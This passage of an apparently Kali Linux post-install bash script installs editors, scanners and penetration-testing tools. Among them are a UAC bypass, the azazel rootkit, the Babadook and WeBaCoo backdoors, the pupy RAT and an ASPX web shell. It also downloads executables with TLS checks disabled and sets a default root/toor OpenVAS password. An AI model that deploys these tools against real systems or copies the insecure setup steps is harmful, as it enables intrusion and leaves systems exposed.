for file in /etc/bash.bashrc ~/.zshrc; do     #~/.bashrc
  [ ! -e "${file}" ] && continue
  [ -e "${file}" ] && cp -n $file{,.bkup}
  ([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
  grep -q 'MSF_DATABASE_CONFIG' "${file}" 2>/dev/null \
    || echo -e 'MSF_DATABASE_CONFIG=/usr/share/metasploit-framework/config/database.yml\n' >> "${file}"
done
#--- Test
#msfrpcd -U msf -P test -f -S -a 127.0.0.1

##### Install exe2hex
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}exe2hex${RESET} ~ Inline file transfer"
timeout 300 curl  -k -L -f "https://raw.githubusercontent.com/g0tmi1k/exe2hex/master/exe2hex.py" > /usr/local/bin/exe2hex || echo -e ' '${RED}'[!]'${RESET}" Issue downloading exe2hex" 1>&2
chmod +x /usr/local/bin/exe2hex


##### Install MPC
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}MPC${RESET} ~ Msfvenom Payload Creator"
timeout 300 curl  -k -L -f "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/local/bin/mpc || echo -e ' '${RED}'[!]'${RESET}" Issue downloading mpc" 1>&2
chmod +x /usr/local/bin/mpc

##### Install Geany
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}Geany${RESET} ~ GUI text editor"
export DISPLAY=:0.0   #[[ -z $SSH_CONNECTION ]] || export DISPLAY=:0.0
apt -y -qq install geany || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Add to panel (GNOME)
if [[ $(which gnome-shell) ]]; then
dconf load /org/gnome/gnome-panel/layout/objects/geany/ << EOF
[instance-config]
location='/usr/share/applications/geany.desktop'

[/]
object-iid='PanelInternalFactory::Launcher'
pack-index=3
pack-type='start'
toplevel-id='top-panel'
EOF
dconf write /org/gnome/gnome-panel/layout/object-id-list "$(dconf read /org/gnome/gnome-panel/layout/object-id-list | sed "s/]/, 'geany']/")"
fi
#--- Configure geany
timeout 5 geany >/dev/null 2>&1   #geany & sleep 5s; killall -q -w geany >/dev/null   # Start and kill. Files needed for first time run
# Geany -> Edit -> Preferences. Editor -> Newline strips trailing spaces: Enable. -> Indentation -> Type: Spaces. -> Files -> Strip trailing spaces and tabs: Enable. Replace tabs by space: Enable. -> Apply -> Ok
file=~/.config/geany/geany.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
touch ${file}  # *** this will not work as geany now only writes its config after a 'clean' quit.
sed -i 's/^.*sidebar_pos=.*/sidebar_pos=1/' "${file}"
sed -i 's/^.*check_detect_indent=.*/check_detect_indent=true/' "${file}"
sed -i 's/^.*detect_indent_width=.*/detect_indent_width=true/' "${file}"
sed -i 's/^.*pref_editor_tab_width=.*/pref_editor_tab_width=2/' "${file}"
sed -i 's/^.*indent_type.*/indent_type=2/' "${file}"
sed -i 's/^.*autocomplete_doc_words=.*/autocomplete_doc_words=true/' "${file}"
sed -i 's/^.*completion_drops_rest_of_word=.*/completion_drops_rest_of_word=true/' "${file}"
sed -i 's/^.*tab_order_beside=.*/tab_order_beside=true/' "${file}"
sed -i 's/^.*show_indent_guide=.*/show_indent_guide=true/' "${file}"
sed -i 's/^.*long_line_column=.*/long_line_column=48/' "${file}"
sed -i 's/^.*line_wrapping=.*/line_wrapping=true/' "${file}"
sed -i 's/^.*pref_editor_newline_strip=.*/pref_editor_newline_strip=true/' "${file}"
sed -i 's/^.*pref_editor_ensure_convert_line_endings=.*/pref_editor_ensure_convert_line_endings=true/' "${file}"
sed -i 's/^.*pref_editor_replace_tabs=.*/pref_editor_replace_tabs=true/' "${file}"
sed -i 's/^.*pref_editor_trail_space=.*/pref_editor_trail_space=true/' "${file}"
sed -i 's/^.*pref_toolbar_append_to_menu=.*/pref_toolbar_append_to_menu=true/' "${file}"
sed -i 's/^.*pref_toolbar_use_gtk_default_style=.*/pref_toolbar_use_gtk_default_style=false/' "${file}"
sed -i 's/^.*pref_toolbar_use_gtk_default_icon=.*/pref_toolbar_use_gtk_default_icon=false/' "${file}"
sed -i 's/^.*pref_toolbar_icon_size=/pref_toolbar_icon_size=2/' "${file}"
sed -i 's/^.*treeview_position=.*/treeview_position=744/' "${file}"
sed -i 's/^.*msgwindow_position=.*/msgwindow_position=405/' "${file}"
sed -i 's/^.*pref_search_hide_find_dialog=.*/pref_search_hide_find_dialog=true/' "${file}"
sed -i 's#^.*project_file_path=.*#project_file_path=~/#' "${file}"
#sed -i 's/^pref_toolbar_show=.*/pref_toolbar_show=false/' "${file}"
#sed -i 's/^sidebar_visible=.*/sidebar_visible=false/' "${file}"
grep -q '^custom_commands=sort;' "${file}" || sed -i 's/\[geany\]/[geany]\ncustom_commands=sort;/' "${file}"
# Geany -> Tools -> Plugin Manger -> Save Actions -> HTML Characters: Enabled. Split Windows: Enabled. Save Actions: Enabled. -> Preferences -> Backup Copy -> Enable -> Directory to save backup files in: ~/backups/geany/. Directory levels to include in the backup destination: 5 -> Apply -> Ok -> Ok
sed -i 's#^.*active_plugins.*#active_plugins=/usr/lib/geany/htmlchars.so;/usr/lib/geany/saveactions.so;/usr/lib/geany/splitwindow.so;#' "${file}"
mkdir -p ~/backups/geany/
mkdir -p ~/.config/geany/plugins/saveactions/
file=~/.config/geany/plugins/saveactions/saveactions.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
[ -e "${file}" ] || cat <<EOF > "${file}"
[saveactions]
enable_autosave=false
enable_instantsave=false
enable_backupcopy=true
[autosave]
print_messages=false
save_all=false
interval=300
[instantsave]
default_ft=None
[backupcopy]
dir_levels=5
time_fmt=%Y-%m-%d-%H-%M-%S
backup_dir=~/backups/geany
EOF


##### Install kali-tweaks
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}kali-tweaks${RESET} ~ Compares two files word by word"
apt -y -qq install kali-tweaks || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

##### Install wdiff
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}wdiff${RESET} ~ Compares two files word by word"
apt -y -qq install wdiff wdiff-doc || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install Meld
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}Meld${RESET} ~ GUI text compare"
apt -y -qq install meld || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure meld
gconftool-2 -t bool -s /apps/meld/show_line_numbers true
gconftool-2 -t bool -s /apps/meld/show_whitespace true
gconftool-2 -t bool -s /apps/meld/use_syntax_highlighting true
gconftool-2 -t int -s /apps/meld/edit_wrap_lines 2


##### Install vbindiff
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}vbindiff${RESET} ~ visually compare binary files"
apt -y -qq install vbindiff \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2


##### Install OpenVAS
if [[ "${openVAS}" != "false" ]]; then
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}OpenVAS${RESET} ~ vulnerability scanner"
  apt -y -qq install openvas \
    || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
  openvas-setup
  #--- Bug fix (target credentials creation)
  mkdir -p /var/lib/openvas/gnupg/
  #--- Bug fix (keys)
  curl  -k -L -f "http://www.openvas.org/OpenVAS_TI.asc" | gpg --import - \
    || echo -e ' '${RED}'[!]'${RESET}" Issue downloading OpenVAS_TI.asc" 1>&2
  #--- Make sure all services are correct
  openvas-start
  #--- User control
  username="root"
  password="toor"
  (openvasmd --get-users | grep -q ^admin$) \
    && echo -n 'admin user: ' \
    && openvasmd --delete-user=admin
  (openvasmd --get-users | grep -q "^${username}$") \
    || (echo -n "${username} user: "; openvasmd --create-user="${username}"; openvasmd --user="${username}" --new-password="${password}" >/dev/null)
  echo -e " ${YELLOW}[i]${RESET} OpenVAS username: ${username}"
  echo -e " ${YELLOW}[i]${RESET} OpenVAS password: ${password}   ***${BOLD}CHANGE THIS ASAP${RESET}***"
  echo -e " ${YELLOW}[i]${RESET} Run: # openvasmd --user=root --new-password='<NEW_PASSWORD>'"
  sleep 3s
  openvas-check-setup
  #--- Remove from start up
  systemctl disable openvas-manager
  systemctl disable openvas-scanner
  systemctl disable greenbone-security-assistant
  #--- Setup alias
  file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
  grep -q '^## openvas' "${file}" 2>/dev/null \
    || echo -e '## openvas\nalias openvas="openvas-stop; openvas-start; sleep 3s; xdg-open https://127.0.0.1:9392/ >/dev/null 2>&1"\n' >> "${file}"
  source "${file}" || source ~/.zshrc
else
  echo -e "\n\n ${YELLOW}[i]${RESET} ${YELLOW}Skipping OpenVAS${RESET} (missing: '$0 ${BOLD}--openvas${RESET}')..." 1>&2
fi


##### Install vFeed
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}vFeed${RESET} ~ vulnerability database"
apt -y -qq install vfeed || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2




##### Configure python console - all users
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring ${GREEN}python console${RESET} ~ tab complete & history support"
export PYTHONSTARTUP=$HOME/.pythonstartup
file=/etc/bash.bashrc; [ -e "${file}" ] && cp -n $file{,.bkup}   #~/.bashrc
grep -q PYTHONSTARTUP "${file}" || echo 'export PYTHONSTARTUP=$HOME/.pythonstartup' >> "${file}"
#--- Python start up file
cat <<EOF > ~/.pythonstartup || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
import readline
import rlcompleter
import atexit
import os
## Tab completion
readline.parse_and_bind('tab: complete')
## History file
histfile = os.path.join(os.environ['HOME'], '.pythonhistory')
try:
    readline.read_history_file(histfile)
except IOError:
    pass
atexit.register(readline.write_history_file, histfile)
## Quit
del os, histfile, readline, rlcompleter
EOF
#--- Apply new configs
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi


##### Install virtualenvwrapper
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}virtualenvwrapper${RESET} ~ virtual environment wrapper"
apt -y -qq install virtualenvwrapper || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install go
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}go${RESET} ~ programming language"
apt -y -qq install golang || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install gitg
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}gitg${RESET} ~ GUI git client"
apt -y -qq install gitg || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

##### Install onesixtyone
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}graudit${RESET} ~ onesixtyone"
apt -y -qq install onesixtyone || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

##### Install sparta
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}sparta${RESET} ~ GUI automatic wrapper"
apt -y -qq install sparta || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install wireshark
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Wireshark${RESET} ~ GUI network protocol analyzer"
#--- Hide running as root warning
mkdir -p ~/.wireshark/
file=~/.wireshark/recent_common;   #[ -e "${file}" ] && cp -n $file{,.bkup}
[ -e "${file}" ] || echo "privs.warn_if_elevated: FALSE" > "${file}"
#--- Hide 'Lua: Error during loading' warning
file=/usr/share/wireshark/init.lua; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^disable_lua = .*/disable_lua = true/' "${file}"


##### Install silver searcher
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}silver searcher${RESET} ~ code searching"
apt -y -qq install silversearcher-ag || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install rips
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}rips${RESET} ~ source code scanner"
apt -y -qq install apache2 php5 git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/ripsscanner/rips.git /opt/rips-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/rips-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/etc/apache2/conf-available/rips.conf
[ -e "${file}" ] || cat <<EOF > "${file}"
Alias /rips /usr/share/rips-git
<Directory /usr/share/rips-git/ >
  Options FollowSymLinks
  AllowOverride None
  Order deny,allow
  Deny from all
  Allow from 127.0.0.0/255.0.0.0 ::1/128
</Directory>
EOF
ln -sf /etc/apache2/conf-available/rips.conf /etc/apache2/conf-enabled/rips.conf
systemctl restart apache2


##### Install graudit
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}graudit${RESET} ~ source code auditing"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/wireghoul/graudit.git /opt/graudit-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
#--- Add to path
file=/usr/local/bin/graudit-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/graudit-git/ && bash graudit.sh "\$@"
EOF
chmod +x "${file}"


##### Install cherrytree
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}cherrytree${RESET} ~ GUI note taking"
apt -y -qq install cherrytree || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install ipcalc & sipcalc
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ipcalc${RESET} & ${GREEN}sipcalc${RESET} ~ CLI subnet calculators"
apt -y -qq install ipcalc sipcalc || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2





##### Install asciinema
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}asciinema${RESET} ~ CLI terminal recorder"
apt -y -qq install asciinema || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install psmisc ~ allows for 'killall command' to be used
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}psmisc${RESET} ~ suite to help with running processes"
apt -y -qq install psmisc || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


###### Setup pipe viewer
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}pipe viewer${RESET} ~ CLI progress bar"
apt install -y -qq pv || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


###### Setup pwgen
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}pwgen${RESET} ~ password generator"
apt install -y -qq pwgen || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install htop
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}htop${RESET} ~ CLI process viewer"
apt -y -qq install htop || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install powertop
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}powertop${RESET} ~ CLI power consumption viewer"
apt -y -qq install powertop || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install iotop
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}iotop${RESET} ~ CLI I/O usage"
apt -y -qq install iotop || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install ca-certificates
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ca-certificates${RESET} ~ HTTPS/SSL/TLS"
apt -y -qq install ca-certificates || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install testssl
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}testssl${RESET} ~ Testing TLS/SSL encryption"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/drwetter/testssl.sh.git /opt/testssl-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
ln -sf /opt/testssl-git/testssl.sh /usr/local/bin/testssl-git
chmod +x /opt/testssl-git/testssl.sh


##### Install UACScript
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}UACScript${RESET} ~ UAC Bypass for Windows 7"
apt -y -qq install git windows-binaries || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/Vozzie/uacscript.git /opt/uacscript-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
ln -sf /usr/share/windows-binaries/uac-win7 /opt/uacscript-git/





##### Install axel
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}axel${RESET} ~ CLI download manager"
apt -y -qq install axel || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^alias axel' "${file}" 2>/dev/null || echo -e '## axel\nalias axel="axel -a"\n' >> "${file}"
#--- Apply new alias
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi


##### Install html2text
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}html2text${RESET} ~ CLI html rendering"
apt -y -qq install html2text || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install gparted
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}GParted${RESET} ~ GUI partition manager"
apt -y -qq install gparted || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install lynx
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}lynx${RESET} ~ CLI web browser"
apt -y -qq install lynx || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

##### Install ncftp
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ncftp${RESET} ~ CLI FTP client"
apt -y -qq install ncftp \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2


##### Install p7zip
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}p7zip${RESET} ~ CLI file extractor"
apt -y -qq install p7zip-full || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install zip & unzip
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}zip${RESET} & ${GREEN}unzip${RESET} ~ CLI file extractors"
apt -y -qq install zip || echo -e ' '${RED}'[!] Issue with apt'${RESET}     # Compress
apt -y -qq install unzip || echo -e ' '${RED}'[!] Issue with apt'${RESET}   # Decompress


##### Install file roller
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}file roller${RESET} ~ GUI file extractor"
apt -y -qq install file-roller || echo -e ' '${RED}'[!] Issue with apt'${RESET}                                            # GUI program
apt -y -qq install unace unrar rar unzip zip p7zip p7zip-full p7zip-rar || echo -e ' '${RED}'[!] Issue with apt'${RESET}   # Supported file compressions types


##### Install VPN support
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}VPN${RESET} support for Network-Manager"
#*** I know its messy...
for FILE in network-manager-openvpn network-manager-pptp network-manager-vpnc network-manager-openconnect; do
  apt -y -qq install "${FILE}" || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
done


##### Install CherryTree
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}CherryTree${RESET} ~ note taker high"
apt -y -qq install cherrytree || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install hashid
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}hashid${RESET} ~ identify hash types"
apt -y -qq install hashid || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install httprint
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}httprint${RESET} ~ GUI web server fingerprint"
apt -y -qq install httprint || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install lbd
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}lbd${RESET} ~ load balancing detector"
apt -y -qq install lbd || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install wafw00f
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}wafw00f${RESET} ~ WAF detector"
apt -y -qq install git python python-pip || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/sandrogauci/wafw00f.git /opt/wafw00f-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/wafw00f-git/ >/dev/null
git pull -q
python3 setup.py install
popd >/dev/null


##### Install vulscan script for nmap
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}vulscan script for nmap${RESET} ~ vulnerability scanner add-on"
apt -y -qq install nmap curl || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
mkdir -p /usr/share/nmap/scripts/vulscan/
timeout 300 curl  -k -L -f "http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz" > /tmp/nmap_nse_vulscan.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading file" 1>&2      #***!!! hardcoded version! Need to manually check for updates
gunzip /tmp/nmap_nse_vulscan.tar.gz
tar -xf /tmp/nmap_nse_vulscan.tar -C /usr/share/nmap/scripts/
#--- Fix permissions (by default its 0777)
chmod -R 0755 /usr/share/nmap/scripts/; find /usr/share/nmap/scripts/ -type f -exec chmod 0644 {} \;
#--- Remove old temp files
rm -f /tmp/nmap_nse_vulscan.tar*


##### Install unicornscan
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}unicornscan${RESET} ~ fast port scanner"
apt -y -qq install unicornscan || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

##### Install cewl
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Cewl${RESET} ~ website keyword scarper"
apt -y -qq install cewl || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
#Example: cewl -d 2 -m 5 -w docswords.txt http://docs.kali.org

##### Install onetwopunch
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}onetwopunch${RESET} ~ unicornscan & nmap wrapper"
apt -y -qq install git nmap unicornscan || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/superkojiman/onetwopunch.git /opt/onetwopunch-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/onetwopunch-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/onetwopunch-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/onetwopunch-git/ && bash onetwopunch.sh "\$@"
EOF
chmod +x "${file}"


##### Install Gnmap-Parser (Fork)
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Gnmap-Parser (Fork)${RESET} ~ Parse Nmap exports into various plain-text formats"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/nullmode/gnmap-parser.git /opt/gnmap-parser-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
ln -sf /opt/gnmap-parser-git/Gnmap-Parser.sh /usr/local/bin/gnmap-parser-git
chmod +x /opt/gnmap-parser-git/Gnmap-Parser.sh


##### Install udp-proto-scanner
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}udp-proto-scanner${RESET} ~ common UDP port scanner"
apt -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#mkdir -p /usr/share/udp-proto-scanner/
timeout 300 curl  -k -L -f "https://labs.portcullis.co.uk/download/udp-proto-scanner-1.1.tar.gz" -o /tmp/udp-proto-scanner.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading udp-proto-scanner.tar.gz" 1>&2
gunzip /tmp/udp-proto-scanner.tar.gz
tar -xf /tmp/udp-proto-scanner.tar -C /opt/
mv -f /opt/udp-proto-scanner{-1.1,}
file=/usr/local/bin/udp-proto-scanner
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/udp-proto-scanner/ && perl udp-proto-scanner.pl "\$@"
EOF
chmod +x "${file}"
#--- Remove old temp files
rm -f /tmp/udp-proto-scanner.tar*



##### Install azazel
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}azazel${RESET} ~ Linux userland rootkit"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/chokepoint/azazel.git /opt/azazel-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/azazel-git/ >/dev/null
git pull -q
popd >/dev/null


##### Install Babadook
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Babadook${RESET} ~ connection-less powershell backdoor"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/jseidl/Babadook.git /opt/babadook-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install pupy
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}pupy${RESET} ~ Remote Administration Tool"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/n1nj4sec/pupy.git /opt/pupy-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install gobuster
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}gobuster${RESET} ~ Directory/File/DNS busting tool"
apt -y -qq install git golang || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/OJ/gobuster.git /opt/gobuster-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/gobuster-git/ >/dev/null
go build
popd >/dev/null
#--- Add to path
file=/usr/local/bin/gobuster-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/gobuster-git/ && ./gobuster "\$@"
EOF
chmod +x "${file}"





##### Install WeBaCoo
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}WeBaCoo${RESET} ~ Web backdoor cookie"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/anestisb/WeBaCoo.git /opt/webacoo-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
ln -sf /opt/webacoo-git/ /usr/share/webshells/php/webacoo


##### Install cmdsql
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}cmdsql${RESET} ~ (ASPX) web shell"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/NetSPI/cmdsql.git /opt/cmdsql-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
